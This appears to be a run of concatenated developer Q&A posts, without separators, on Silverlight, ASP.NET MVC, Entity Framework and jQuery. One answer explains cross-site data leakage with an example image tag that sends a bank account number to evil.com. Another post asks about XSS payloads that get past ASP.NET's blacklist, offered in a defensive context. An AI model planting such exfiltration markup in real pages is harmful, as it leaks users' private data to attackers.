communications, but also the validation rules.Silverlight integration with HTML / JavascriptSilverlight can both call and be called from Javascript via the HTML bridge. This means that your Silverlight components can be as closely integrated with your web-page as you'd like. Silverlight can also directly interact with the DOM - setting and reading form values, changing CSS properties, etc. You can do just about anything you'd do in Javascript via the HTML bridge if you'd like. n-th child pseudo selectors do this, but they're not widely supported yet and won't be for a while. You'll either need Javascript / jQuery or to write out a special class for the items you want to hide or just hide the items directly.Here's how you'd do it with jQuery:$("ul.mybuttons li:nth-child(2)").hide(); You can use the good old firstFlag approach:var firstFlag = true;$.each(data.collection, function() { if(!firstFlag) DoStuffButOnlyIfNotTheFirstOne(); firstFlag = false;}But instead, I'd recommend that you filter your data collection first to remove the first item using a selector. You need to use the [Include] attribute on referenced classes to indicate that you want those classes serialized as well:public class Monkey { [Key] int number; String mystring; [Include] OtherObject anotherobject;}This can also be done in code:public IQueryable&lt;Monkey&gt; GetMonkeys(){ var Monkey = this.Context.Monkey.Include("Monkey.OtherObject"); return Monkey;} Some references:http://www.silverlightshow.net/items/Creating-applications-with-.NET-RIA-Service-Part-3-Adding-DomainService-class.aspxhttp://blogs.msdn.com/brada/archive/2009/07/22/business-apps-example-for-silverlight-3-rtm-and-net-ria-services-july-update-part-6-poco-and-authentication-provider.aspx Depends on your SMTP server and network setup setup, as well as your code. Your bottleneck is probably communication with your SMTP server - is it possible to run the e-mail sending code and the SMTP server on the same computer? That's just there so that Blend knows how to display your XAML in design mode. Specifically, if you've got a fluid layout that stretches to fill its container, there's no clear way for Blend to know how tall your design should be; LayoutOverrides defines that.Those LayoutOverride settings entries are added when you (or another person running Blend) manually resizes the elements in the design surface. If you're seeing them all over your code (such as in a Border element):You can usually delete them without any noticable affectYou might look at how you're using Blend - specifically, you should size the parent cotainer to a good size (UserControl / LayoutRoot), then set the child sizes based on fluid layout - e.g. padding and margin or * sizesNote that Blend's ignorable attributes are stripped out at compile time and have no affect on your application's performance. So while you may want to remove them to improve code readability, they don't affect how your application runs. I just tried this with a tall image and it worked fine. I suspect that the problem is with the Image element's container - it's actually showing the entire image, but the top and bottom are being clipped off.Here's what I used to test: &lt;UserControl xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" x:Class="Temp_Delete.MainPage" Width="640" Height="480"&gt; &lt;Grid x:Name="LayoutRoot" Background="White"&gt; &lt;Image Source="Tall.png" Stretch="Uniform"&gt;&lt;/Image&gt; &lt;/Grid&gt; &lt;/UserControl&gt;UPDATE: All your nested borders are throwing it off since they don't have a defined height. I'd use an ImageBrush on the top level border:&lt;UserControl xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" x:Class="Temp_Delete.MainPage" Width="640" Height="480"&gt; &lt;Grid x:Name="LayoutRoot"&gt; &lt;Grid.ColumnDefinitions&gt; &lt;ColumnDefinition Width="9"/&gt; &lt;ColumnDefinition Width="30"/&gt; &lt;ColumnDefinition Width="30"/&gt; &lt;ColumnDefinition Width="*"/&gt; &lt;ColumnDefinition Width="30"/&gt; &lt;ColumnDefinition Width="50"/&gt; &lt;ColumnDefinition Width="30"/&gt; &lt;ColumnDefinition Width="9"/&gt; &lt;/Grid.ColumnDefinitions&gt; &lt;Grid.RowDefinitions&gt; &lt;RowDefinition Height="*"/&gt; &lt;RowDefinition Height="30" /&gt; &lt;/Grid.RowDefinitions&gt; &lt;Border BorderBrush="Black" Grid.Row="0" Grid.ColumnSpan="8" BorderThickness="1, 1, 1, 0"&gt; &lt;Border.Background&gt; &lt;ImageBrush Stretch="Uniform"/&gt; &lt;/Border.Background&gt; &lt;Border BorderBrush="Black" BorderThickness="9,9,9, 0"&gt; &lt;Border BorderBrush="Gray" BorderThickness="1, 1, 1, 0"&gt; &lt;StackPanel VerticalAlignment="Center" HorizontalAlignment="Center"&gt; &lt;MediaElement Height="Auto" Width="Auto" Visibility="Collapsed" AutoPlay="true" Stretch="Fill" MediaFailed="SilverlightMediaPlayer_MediaFailed" Name="previewMediaElement"/&gt; &lt;/StackPanel&gt; &lt;/Border&gt; &lt;/Border&gt; &lt;/Border&gt; &lt;/Grid&gt;&lt;/UserControl&gt;May take a little tweaking to get all the borders to display correctly, but you can set the padding / margin on the container elements if that's important to you.Can you verify if your image works in that XAML? Can you post more of your XAML so we can see the context? I've done old-school URL Rewriting in ASP.NET and it works, but I'd really recommend that you look into using Routing instead. It works with ASP.NET Webforms as well as MVC, and it's more smoothly baked into the ASP.NET system.One other option you can look into is the IIS URL Rewriting module. It's worked well for me. It's difficult. I'd take a look at some projects which have done some of the hard work for you, e.g. Dokan. Expired items aren't immediately removed from the cache, they're just marked as expired. You don't get a callback until a cache miss. I ran into this back in the ASP.NET 1.1 days, and it hasn't changed.There may be cases where expired items are removed immediately - such as if there's low memory and high CPU - but you can't count on it.I usually use a timer that reloads the cache on a regular basis. I've looked into this a little. I tried the Microsoft Speech API but got very poor results. I've been wanting to look into the CMU Sphinx project, especially the Transcriber demo. I'm guessing that the problem is either:The Silverlight object tag or Javascript is using a 100% height and width div, which doesn't work in Firefox unless all the parents have height and width set. You can verify this is the problem by setting a background color for the entire Silverlight object. If so, you can either specify a pixel height and width, or you can make sure height and width are set for all the parent elements for the Silverlight object.You may be setting the height and width before they're available. It's recommended that you access them in the OnResize event (see the "Important Note" on this MSDN page). What event are you setting them from? You might want to explain more of what you're trying to accomplish than how you're trying to accomplish it. For instance, you can maintain a duplex connection between client and server, allowing you to "push" information down from your ASP.NET application to your Silverlight object. There are a lot of other lightweight alternatives that don't require a full-featured webservice.Why do you like to be able to call Silverlight methods from your ASP.NET code? The whole reason for keeping XAP size small is so that your application loads as quickly as possible. This is important: even on a faster connection, a bloated XAP can take extra seconds to load, which can be long enough for your users to leave your site.While Linq is only accounting for 46KB, there are other cases where this can make a bigger deal. For instance, the SyndicationFeed class makes it really easy to handle RSS and ATOM feeds, but it weighs in at 114KB.Application library caching helps in two ways:It allows for sharing common DLL's between applications, so if another application has already pulled down a system DLL, your app can just reference it.It allows your application updates to be smaller, since the framework DLL's won't change betwen XAP versions. Milliseconds. See Pete Brown's posting here. Misuse of auth cookies (XSRF, some XSS scenarios) is just part of the problem. It's also pretty easy to send information from a "good" site to an "evil" one via querystring (e.g. grab some data from a bank page and send it to evil.com by including &lt;image src="http://evil.com/1px.gif?bankaccount=1122334455"/&gt;Blocking cookies might limit access from a bad site to a good one, but you've also got to guard the cases where script injection or other attacks expose data in a trusted site which could then be transmitted to a bad site, and that doesn't require cookies. If you have Expression Encoder, you can do the following:Create a blank movie that has as many frames as your animation (you can change the length later if you get it wrong) Use the XAML Animation overlay option to add your XAML-based animation Render out the animation to WMVConvert the video from WMV to AVI (many free tools will do this)I believe the free version of Expression Encoder will handle this. If Expression Encoder won't work for you, you can also use screen capture software like Jing or Camtasia. Silverlight is just a standard HTML &lt;object&gt; so it can be delivered by anything that will serve HTML. However, it seems like a strange architecture for a client/server solution. For what you're describing, I'd look at either:Silverlight out-of-browser applicationWPF application delivered via ClickOnceSilverlight application that is loaded from a website but communicates with your existing backend using Silverlight's socket supportCan you explain why you're looking at building a custom server instead of one of the above approaches? Yes. It's used in XUL, the system that Firefox and other Mozilla applications are built with. The XULRunner allows other developers to build XUL based applications; see this list on wikipedia. You could look at Phil Haack's NamedFormat extension, which allows you to use formats like NamedFormat("{{{foo}}}", new {foo = 123}) As mentioned in comments, you might want to look at OpenID. The most secure way to manage passwords is to eliminate them. Silverlight webservice security follows the same patterns you'd use for ASP.NET security, especially services exposed to AJAX. The best way to do make use of ASP.NET's authentication.RIA Services is an even better way to handle this. It rides on top of the ASP.NET authorization, but validates on both the client and server-side automatically to combat service spoofing. It let you take care of both client and server-side authorization by adding attributes to your methods indicating that the method requires authorized access, and by which groups or users if you need to be specific.In addition to wire-side security and obfuscation, remember that clients can attach a debugger to Silverlight applications running in their browser. See this example from MSDN Magazine's Security IQ Test, November 2008. Take a look at Shazzam. It doesn't feature interactive debugging, but it's pretty easy to edit and refresh. One other option is to use a querystring value. Very lame, but simpler than custom encoding.http://localhost:5000/Home/About?100%2f200 Andy Beaulieu has a good post on the various collision detection methods in Silverlight 3. While Vimeo is more of a professional site, YouTube offers HTML5 / H.264 video playback support for all videos, so they'll play on iPhone. Vimeo currently doesn't support that on user videos, and is planning on adding it as a pro feature in the future. Use Phil Haack's RouteDebugger. It'll tell you what was matched, which often clears the problem up pretty quickly.It's really easy to set up: drop RouteDebug.dll in your /bin folder and make this change to your App Start event:protected void Application_Start(object sender, EventArgs e){ RegisterRoutes(RouteTable.Routes); RouteDebug.RouteDebugger.RewriteRoutesForTesting(RouteTable.Routes);} The OnSuccess parameter takes a string which gives the name of a function to be called, not the actual function call. So you can pass it "fadeDel", but not "fadeDel(5)". When you do pass it a Javascript call, it's evaluating it immediately, so it's executing fadeDel(5) right when you click submit, even before the AJAX call is made. You can verify that by debugging with Firebug or IE tester tools.If you want to handle this with an OnSuccess method, it'll need to be one that doesn't take any parameters. One way to do that is by grabbing the product ID from "this", which will be the submitting form. You could either parse it from the Form ID, or just include it in the form's Title or Name property:&lt;% using (Ajax.BeginForm("DeleteProduct", "Commerce", new { id = product.Id }, new AjaxOptions { OnSuccess = "fadeDel", Confirm = "Are you sure you want to delete" + product.Title }, new { id = "frm" + product.Id, name = product.Id })){ %&gt; &lt;input type="submit" name="Delete" /&gt;&lt;%} %&gt;Then you can update fadeDel to pull the value from 'this':function fadeDel() { var id = this.name; $("#product" + id).fadeOut(500);}There are other ways to handle this - e.g. a jQuery.ajax() call - but a parameterless OnSuccess call should work fine. I have a schema similar to the standard Product / OrderDetails / Order setup. I want to delete a single Product and cascade delete all OrderDetails which reference that product.Assuming that I've thought this through from the business rules perspective, what's the most elegant way to handle that with Entity Framework 4? I have a standard store schema with an InvoiceLine table that contains Products. I'd like to get a list of the top 5 products by sales as a List. What's the cleanest way to do that? This can't be the best way: private List&lt;Product&gt; GetTopProducts(int count) { var topProducts = from invoiceLine in storeDB.InvoiceLines group invoiceLine by invoiceLine.ProductId into grouping orderby grouping.Count() descending select new { Products = from Product in storeDB.Products where grouping.Key == Product.ProductId select Product }; return topProducts.AsEnumerable().Cast&lt;Product&gt;().Take(count).ToList&lt;Product&gt;(); } Use .title{ display: inline-block; height: 25px;}The only trick is browser support. Check if your list of supported browsers handles inline-block here. You can use Url.Action to specify generate the url to a controller action, so you could use either of the following:&lt;form method="post" action="&lt;%: Url.Action("About", "Home") %&gt;"&gt; &lt;input type="submit" value="Click me to go to /Home/About" /&gt;&lt;/form&gt;or:&lt;form action="#"&gt; &lt;input type="submit" onclick="parent.location='&lt;%: Url.Action("About", "Home") %&gt;';return false;" value="Click me to go to /Home/About" /&gt; &lt;input type="submit" onclick="parent.location='&lt;%: Url.Action("Register", "Account") %&gt;';return false;" value="Click me to go to /Account/Register" /&gt;&lt;/form&gt; I'm deleting several items from a table using Entity Framework. There isn't a foreign key / parent object so I can't handle this with OnDeleteCascade.Right now I'm doing this:var widgets = context.Widgets .Where(w =&gt; w.WidgetId == widgetId);foreach (Widget widget in widgets){ context.Widgets.DeleteObject(widget);}context.SaveChanges();It works but the foreach bugs me. I'm using EF4 but I don't want to execute SQL. I just want to make sure I'm not missing anything - this is as good as it gets, right? I can abstract it with an extension method or helper, but somewhere we're still going to be doing a foreach, right? The Json() controller method returns a JsonResult, which isn't the same as a JSON string. The JsonResult holds data, but the data is actually written directly to the response when the View Engine calls JsonResult.ExecuteResult(). That's all probably more information than you want there - the point is that calling Json() in a controller won't give you a string of JSON.If you just want to turn your data into a JSON string, you can use the JavaScriptSerializer, which is what the Json() method uses internally:JavaScriptSerializer serializer = new JavaScriptSerializer();ViewData["JsonRegionList"] = serializer.Serialize(jsonRegionList);  I've converted a large document from Word to HTML. It's close, but I have a bunch of "code" nodes that I'd like to merge into one "pre" node.Here's the input:&lt;p&gt;Here's a sample MVC Controller action:&lt;/p&gt;&lt;code&gt; public ActionResult Index()&lt;/code&gt;&lt;code&gt; {&lt;/code&gt;&lt;code&gt; return View();&lt;/code&gt;&lt;code&gt; }&lt;/code&gt;&lt;p&gt;We'll start by making the following changes...&lt;/p&gt;I want to turn it into this, instead:&lt;p&gt;Here's a sample MVC Controller action:&lt;/p&gt;&lt;pre class="brush: csharp"&gt; public ActionResult Index() { return View(); }&lt;/pre&gt;&lt;p&gt;We'll start by making the following changes...&lt;/p&gt;I ended up writing a brute-force loop that iterates nodes looking for consecutive ones, but this seems ugly to me:HtmlDocument doc = new HtmlDocument();doc.Load(file);var nodes = doc.DocumentNode.ChildNodes;string contents = string.Empty;foreach (HtmlNode node in nodes){ if (node.Name == "code") { contents += node.InnerText + Environment.NewLine; if (node.NextSibling.Name != "code" &amp;&amp; !(node.NextSibling.Name == "#text" &amp;&amp; node.NextSibling.NextSibling.Name == "code") ) { node.Name = "pre"; node.Attributes.RemoveAll(); node.SetAttributeValue("class", "brush: csharp"); node.InnerHtml = contents; contents = string.Empty; } }}nodes = doc.DocumentNode.SelectNodes(@"//code");foreach (var node in nodes){ node.Remove();}Normally I'd remove the nodes in the first loop, but that doesn't work during iteration since you can't change the collection as you iterate over it.Better ideas? Rather than modifying configuration, you can register HttpHandlers at application startup in code using the PreApplicationStartupMethod. Example code (from Nikhil Kothari's blog post):[assembly: PreApplicationStartMethod(typeof(UserTrackerModule), "Register")]namespace DynamicWebApp.Sample { public sealed class UserTrackerModule : IHttpModule { #region Implementation of IHttpModule void IHttpModule.Dispose() { } void IHttpModule.Init(HttpApplication application) { application.PostAuthenticateRequest += delegate(object sender, EventArgs e) { IPrincipal user = application.Context.User; if (user.Identity.IsAuthenticated) { DateTime activityDate = DateTime.UtcNow; // TODO: Use user.Identity and activityDate to do // some interesting tracking } }; } #endregion public static void Register() { DynamicHttpApplication.RegisterModule(delegate(HttpApplication app) { return new UserTrackerModule(); }); } }}Also see Phil Haack's post, Three Hidden Extensibility Gems in ASP.NET 4. IE9 supports this, but only for file formats it supports. For instance, it works for MP3 files but it will not work for WAV files.

You can easily call methods on an object directly by enabling a method for scripting using the ScriptableMember attribute, but you can't invoke it as a string directly.I think you're stuck with eval. Some hints on where to get started:Get Tim Heuer's Cross Domain helpersUse Silverlight Spy's Cross-domain Access Policy Validator if you get stuck: http://timheuer.com/blog/archive/2008/04/06/silverlight-cross-domain-policy-file-snippet-intellisense.aspx You can check ModelState.Count. If ModelState.Count == 0 then no values were set to your model during binding. This is a feature of the Razor view engine - it handles the switch between HTML/Javascript and your server-side view code so you don't need to escape it in most cases.See Scott Guthrie's blog post on it: http://weblogs.asp.net/scottgu/archive/2010/07/02/introducing-razor.aspx I think you're looking for ViewData.TemplateInfo.HtmlFieldPrefix. Example:&lt;input type="text" id="&lt;%= ViewData.TemplateInfo.HtmlFieldPrefix %&gt;"&gt;You can use GetFullHtmlFieldId if you need to specify a field, but if it's used in a Display or Editor Template you can just use HtmlFieldPrefix.More info in this SO question: Rendering the field name in an EditorTemplate (rendered through EditorFor()) I have a Windows Phone application which is reading and writing data from a WCF Data Services service which is hosted in and ASP.NET MVC 3 application.I can configure both client and server as necessary. I'd like to use OpenID if practical, and once a user is authenticated on the phone they should be able to browse through data which is associated with their OpenID.How should I configure client and server to make that work? I'm not sure when it changed, but the Package Manager Console automatically shifts the working directory to the current solution folder when you open an application now. If your shared hosting environment only allows you to use one database, you can add the ASP.NET Membership database tables to your existing database. Joe Stagner has a walkthrough on how to do that here.Can you update your question to tell us where you're hosting? That will help. I'm working on an application which allows data entry and display from both a Windows Phone application and an MVC 3 web interface. Data access for the phone client is via authenticated WCF services hosted in the MVC 3 application. Users will be tracking information which is unique to them, so the service will only show me data which I have entered.What is the simplest way to handle identity in this scenario? I'd thought of using Windows Live ID, since the phone application has access to a Windows Live Anonymous ID property. However, from what I can tell there's no way to get allow for a web-based Windows Live sign-in which gives me the same Windows Live Anonymous ID - Windows Live Messenger Connect login gives me a site-specific unique ID, which would be different from the phone client's Anonymous ID.Alternatively, I could use Facebook authentication on both client and phone with Facebook SDK. My concern there is in securing the service calls. I'm thinking that the first time a device connects with the service with a Facebook ID, the server issues it a key, and both the Facebook ID and the server issued key are required for service access.Thoughts on the above? Is there a simpler solution that I'm missing? Windows Live Writer's editing surface wraps the IE Browser Control. The WindowsLive.Writer.BrowserControl class has a TextSize property which probably sets the zoom for the editing surface, but there's no UI to set the property. I've messed with stuff like this before using Snoop (WPF), Spy++ (general Windows), etc., but it's been a while. If I wanted to write a console application which found the Windows Live Writer instance and changed the BrowserControl's TextSize property, how would I do it? I'm looking for an example of an XSS vulnerability that would be stopped just by using the AntiXSS Encoder 4.1 Beta as the runtime encoder (setting in system.web/httpRuntime). I would prefer something that doesn't require any explicit calls to AntiXss functions such as @AntiXss.JavaScriptEncode(ViewBag.UserName)I'm thinking something that would get by the ASP.NET blacklist but wouldn't make it through the AntiXSS whitelist, maybe something to do with alternate character sets or encoding?I've tested UTF-7 vulnerabilities, but don't see any that seem to affect modern browsers. Windows Live Writer hosts an Internet Explorer control for editing, but there's no zoom control. I'd like to be able to send a zoom command to it. Since other apps host the IE browser, I'd think a utility that can send zoom commands to specific IE browser instances would be really handy, but I haven't found one.I've seen there's a command, OLECMDID_OPTICAL_ZOOM, but I'm not sure how to send that command to it. Ideally I'd like to do this from C# or Powershell.Note: The question is asking about controlling the zoom in a web browser control in a running application which I did not create, the main example being the editor surface in Windows Live Writer. A handler is mapped to a specified file name extension. If you want something to execute for every request, you want an HttpModule. There's more information on when to use an HttpHandler vs. an HttpModule here.Registering a handler for an extension, such as .ajax, depends on what version of IIS you're running under. The MSDN documentation explains the different cases. If you want to have one EF model which links your membership tables and application tables, you can add the ASP.NET Membership tables to your existing database using the aspnet_regsql.exe utility. Some links:MSDN documentationTutorial on the ASP.NET websiteOnce you have the Membership tables installed, you can generate EF Code classes that match the membership schema. I posted a detailed walkthrough on how to do that here:Generating EF Code First model classes from an existing database Normally you shouldn't be reading from ReturnUrl. The flow works like this:Request to controller action which requires authentication using the [Authorize] attributeASP.NET MVC adds the ReturnUrl and redirects to /Account/LogOn, automatically encoding and appending the ReturnUrl parameterThe Account/LogOn POST controller action, after authenticating the login information, redirects to the URL in the ReturnUrl.I wrote about that in gory detail in the following posts:Looking at how the ASP.NET MVC Authorize interacts with ASP.NET Forms AuthorizationPreventing Open Redirection Attacks in ASP.NET MVCThe second post indicates one good reason why need to be careful with ReturnUrl - users can tamper with them.In the example you showed above, I'd expect that, after authorization, the user would be redirected to the Forum / Index action, which would then be reading the values. If you are creating the ReturnUrl, you should be URL Encoding the second &amp;. The two sentences:An HttpModule will execute for every request to your application, regardless of extension, and is generally used for things like security, statistics, logging, etc.An HttpHandler is generally associated with a specific extension, and is used for things like RSS feeds, dynamic image generation or modification, and the like.A little more explanation if that's not completely clear:The way I think about them - modules "plug in" to the request pipeline, whereas handlers "handle" a specific file extension. So, if you've got a site with a LoggingModule and a PdfHandler, both will execute for a request to http://example.com/sample.pdf, and the logging module alone will execute for a request to http://example.com/page.aspx.There's a pretty clear article on the difference on MSDN: HTTP Handlers and HTTP Modules Overview I agree with Jakub's answer: there are better ways of handling multi-tenancy than having a different database per user.However, to answer your specific question, there are two options that come to mind:You can set the connection string to a session variable immediately after login.Your data access layer can choose the connection string based on the logged in user when it's created. (I'd recommend this over the first option)To store the connection after login, if you're using the standard ASP.NET MVC Account Controller, look at the LogOn post action:[HttpPost]public ActionResult LogOn(LogOnModel model, string returnUrl){ if (ModelState.IsValid) { if (Membership.ValidateUser(model.UserName, model.Password)) { //EXAMPLE OF WHERE YOU COULD STORE THE CONNECTION STRING Session["userConnectionString"] = SomeClass.GetConnectionStringForUser(model.UserName); FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe); if (Url.IsLocalUrl(returnUrl) &amp;&amp; returnUrl.Length &gt; 1 &amp;&amp; returnUrl.StartsWith("/") &amp;&amp; !returnUrl.StartsWith("//") &amp;&amp; !returnUrl.StartsWith("/\\")) { return Redirect(returnUrl); } else { return RedirectToAction("Index", "Home"); } } else { ModelState.AddModelError("", "The user name or password provided is incorrect."); } } // If we got this far, something failed, redisplay form return View(model);}If you wanted to select the connection string when doing data access, your repository or data access layer will probably have a system for handling that. For instance with Entity Framework Code First, the DbContext constructor allows you to pass in the name of a connection string when you're creating it:connectionString = SomeClass.GetConnectionStringForUser(model.UserName);DbContext context = new DbContext(connectionString);But again, I'd look at other ways of handling multitenancy unless your business dictates that your users have physically separate databases. Note: I'm assuming you have AllowEmptyStrings = true because you're also using your view model outside of a web scenario; otherwise it doesn't seem like there's much of a point to having a Required attribute that allows empty strings in a web scenario.There are three steps to handle this:Create a custom attribute adapter which adds that validation parameterRegister your adapter as an adapter factoryOverride the jQuery Validation function to allow empty strings when that attribute is presentStep 1: The custom attribute adapterI modified the RequiredAttributeAdapter to add in that logic:using System;using System.Collections.Generic;using System.ComponentModel.DataAnnotations;using System.Web.Mvc;namespace CustomAttributes{ /// &lt;summary&gt;Provides an adapter for the &lt;see cref="T:System.Runtime.CompilerServices.RequiredAttributeAttribute" /&gt; attribute.&lt;/summary&gt; public class RequiredAttributeAdapter : DataAnnotationsModelValidator&lt;RequiredAttribute&gt; { /// &lt;summary&gt;Initializes a new instance of the &lt;see cref="T:System.Runtime.CompilerServices.RequiredAttributeAttribute" /&gt; class.&lt;/summary&gt; /// &lt;param name="metadata"&gt;The model metadata.&lt;/param&gt; /// &lt;param name="context"&gt;The controller context.&lt;/param&gt; /// &lt;param name="attribute"&gt;The required attribute.&lt;/param&gt; public RequiredAttributeAdapter(ModelMetadata metadata, ControllerContext context, RequiredAttribute attribute) : base(metadata, context, attribute) { } /// &lt;summary&gt;Gets a list of required-value client validation rules.&lt;/summary&gt; /// &lt;returns&gt;A list of required-value client validation rules.&lt;/returns&gt; public override IEnumerable&lt;ModelClientValidationRule&gt; GetClientValidationRules() { var rule = new ModelClientValidationRequiredRule(base.ErrorMessage); if (base.Attribute.AllowEmptyStrings) { //setting "true" rather than bool true which is serialized as "True" rule.ValidationParameters["allowempty"] = "true"; } return new ModelClientValidationRequiredRule[] { rule }; } }}Step 2. Register this in your global.asax / Application_Start() protected void Application_Start() { AreaRegistration.RegisterAllAreas(); DataAnnotationsModelValidatorProvider.RegisterAdapterFactory(typeof(RequiredAttribute), (metadata, controllerContext, attribute) =&gt; new CustomAttributes.RequiredAttributeAdapter(metadata, controllerContext, (RequiredAttribute)attribute)); RegisterGlobalFilters(GlobalFilters.Filters); RegisterRoutes(RouteTable.Routes); }Step 3. Override the jQuery "required" validation functionThis is done using the jQuery.validator.addMethod() call, adding our custom logic and then calling the original function - you can read more about this approach here. If you are using this throughout your site, perhaps in a script file referenced from your _Layout.cshtml. Here's a sample script block you can drop in a page to test:&lt;script&gt;jQuery.validator.methods.oldRequired = jQuery.validator.methods.required;jQuery.validator.addMethod("required", function (value, element, param) { if ($(element).attr('data-val-required-allowempty') == 'true') { return true; } return jQuery.validator.methods.oldRequired.call(this, value, element, param);},jQuery.validator.messages.required // use default message);&lt;/script&gt; I want to build a Visual Studio 2010 VSIX extension that expands some text based on a call to a method (using the Zen Coding selector-based syntax). Ideally, a user would type a string of text, hit a hotkey, and the string of text would be expanded.I've looked at a lot of samples, but they all focus either on full-blown language services or on simple adornments. Ideally, I'd like to find a full working sample, but I'd be happy with the interfaces / classes and some code.Some references I looked at:http://msdn.microsoft.com/en-us/library/bb165336.aspxhttp://msdn.microsoft.com/en-US/vstudio/ff718165.aspxhttp://msdn.microsoft.com/en-us/library/ee372314.aspxUpdate: I know that Resharper and CodeRush do this kind of thing. I'd like to do this as a stand-alone plugin if possible. Internet Explorer doesn't support the "const" keyword. Can I use a shim that checks if "const" is supported and, if not, redefines it as var? I guess it would be nice if it enforced the constancy, maybe using object.Freeze, but I'd be okay with a simple shim.UPDATE: I want this so I can use existing Javascript libraries that use "const" without modifying them. Obviously, find / replace would work, but it's messy and not very maintainable. In addition to using &lt;clear/&gt; or overwriting the settings in the child web.config, you can use the inheritInChildApplications setting in conjunction with in the parent web.config.Example:&lt;location path="." inheritInChildApplications="false"&gt; &lt;system.web&gt; &lt;!-- ... --&gt; &lt;/system.web&gt;&lt;/location&gt;You can wrap the location around the entire &lt;system.web&gt; or just around specific sections.Some links for more info:inheritInChildApplications on MSDN (read the community content at the bottom for more)StackOverflow: Avoid web.config inheritance in child web application using inheritInChildApplicationsBlog post: Stopping web.config inheritance When you call Redirect() or RedirectToAction(), you're terminating the response so the cookies aren't sent to the client. Some solutions: Use TempData to persist the information across the direct, writing the Cookie in the action you redirect to.Take a look at the way Forms Authentication cookie information is written in the NerdDinner code on CodePlex. As mentioned in the comments, you can persist role information in Session. The recommendation to store the role information in Session and retrieve from Roles if not found would work, but I'd start by using the membership system as-is and performance tuning later if you see that it's a problem, rather than assuming it will be. The Display Mode logic looks for matches in the order they are registered. The default Mobile mode is registered before you add yours, so your new Mobile mode is never evaluated.The general pattern is to insert your new Display Mode at index 0 rather than add a Display Mode. Instead of:DisplayModeProvider.Instance.Modes.Add(mobileMode);use:DisplayModeProvider.Instance.Modes.Insert(0, mobileMode);Alternatively, you can change the browser definitions (e.g. C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\Browsers) to indicate that iPad is not a mobile device, but that can get complex.Also, one gotcha to be aware of: apparently iPad sometimes reports a different user agent. Your device mode selection logic needs to account for both cases. The MSDN library lists the await keyword as an operator. That seems strange to me - I'd have thought it was a modifier, like the async keyword.Why is this an operator? It's common to use a ViewModel which can hold multiple collections or other types to pass to your view.If you don't want / need strongly typed views, you can use ViewBag or ViewData to pass multiple collections to your view as well:public ActionResult Index(){ ViewData["GratuitousGuid"] = Guid.NewGuid(); ViewBag.Products = ProductService.GetProducts(); ViewBag.Countries = CountryService.GetCountries(); ViewBag.Zombies = ZombieService.GetZombies(); return View();} ASP.NET MVC has been increasingly delivered via NuGet packages since ASP.NET MVC 3 Tools Update. This offers several advantages:Upgrades to to components delivered via NuGet - MVC itself and other associated components (Razor, Web API) without waiting for a new "big" release of either ASP.NET MVC, .NET, or Visual Studio.This also means that you can use individual parts as you'd like outside of MVC - for instance, Web API can be used outside of ASP.NET.More and more, components are being shared between UI layers and other parts of ASP.NET. Some examples: routing is shared with Web Forms and Web Pages, Razor is shared with Web Pages, the new OAuth parts are shared with Web Forms.You'll notice that in a project from the Basic template, you'll get the following packages:Microsoft.AspNet.MvcMicrosoft.AspNet.RazorMicrosoft.AspNet.WebApiMicrosoft.AspNet.WebApi.ClientMicrosoft.AspNet.WebApi.CoreMicrosoft.AspNet.WebApi.WebHostMicrosoft.AspNet.WebPagesMicrosoft.Net.HttpMicrosoft.Web.InfrastructureNewtonsoft.JsonFive of the nine are used for Web Api, which has been highly componentized to allow developers a lot of flexibility about where and how they can use them. If you want to minimize your NuGet packages, you can use the Basic template.As you move up into the Basic and Internet templates, you'll see more packages to support the additional features the projects provide. Internet brings in several packages of open-source, non-Microsoft code such as OAuth and JavaScript libraries.There are a lot of JavaScript packages, which is a really good thing when you think about it, since this means that NuGet is automatically handling JavaScript dependencies for you - if you want to upgrade jQueryUI which in turn requires a new version of jQuery, it'll automatically upgrade jQuery for you. I think you'd need to create a class which inherits from ExtendedMembershipProvider and write the LDAP implementation. There's no built-in LDAP support.See this post for more information on how SimpleMembership works in ASP.NET MVC 4. According to Mads' post on implementing Angular IntelliSense, the HTML editor isn't extended in the same way. Instead, you would extend C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\Packages\schemas\html\commonHTML5Types.xsd.I think you could also create a new exampleNameTypes.xsd and reference it from commonHTML5Types.xsd using &lt;xsd:import schemaLocation="exampleNameTypes.xsd"/&gt; as they do for SVG. From Jacques (who writes the installers):Sounds like the files are missing from the project template cache.If he has everything installed then he could try the followingShut down all instance of VSDelete the ProjectTemplatesCacheFolder from Program Files\Microsoft Visual Studio 11.0\Common7\IDE\ProjectTemplatesCacheLaunch the VS developer command prompt as administratorRun devenv /setupConfirm that the ProjectTemplateCache has been rebuiltIf the cache doesn’t rebuild then there is something more serious wrong on the system. I want to resize a screen captured using the Desktop Duplication API in SharpDX. I am using the Screen Capture sample code from the SharpDX Samples repository, relevant portion follows:.SharpDX.DXGI.Resource screenResource;OutputDuplicateFrameInformation duplicateFrameInformation;// Try to get duplicated frame within given timeduplicatedOutput.AcquireNextFrame(10000, out duplicateFrameInformation, out screenResource);if (i &gt; 0){ // copy resource into memory that can be accessed by the CPU using (var screenTexture2D = screenResource.QueryInterface&lt;Texture2D&gt;()) device.ImmediateContext.CopyResource(screenTexture2D, screenTexture); // Get the desktop capture texture var mapSource = device.ImmediateContext.MapSubresource(screenTexture, 0, MapMode.Read, MapFlags.None); System.Diagnostics.Debug.WriteLine(watch.Elapsed); // Create Drawing.Bitmap var bitmap = new System.Drawing.Bitmap(width, height, PixelFormat.Format32bppArgb); var boundsRect = new System.Drawing.Rectangle(0, 0, width, height); // Copy pixels from screen capture Texture to GDI bitmap var mapDest = bitmap.LockBits(boundsRect, ImageLockMode.WriteOnly, bitmap.PixelFormat); var sourcePtr = mapSource.DataPointer; var destPtr = mapDest.Scan0; for (int y = 0; y &lt; height; y++) { // Iterate and write to bitmap...I would like to resize the image much smaller than the actual screen size before processing it as a byte array. I do not need to save the image, just get at the bytes. I would like to do this relatively quickly and efficiently (e.g. leveraging GPU if possible).I'm not able to scale during CopyResource, as the output dimensions are required to be the same as the input dimensions. Can I perform another copy from my screenTexture2D to scale? How exactly do I scale the resource - do I use a Swap Chain, Matrix transform, or something else?
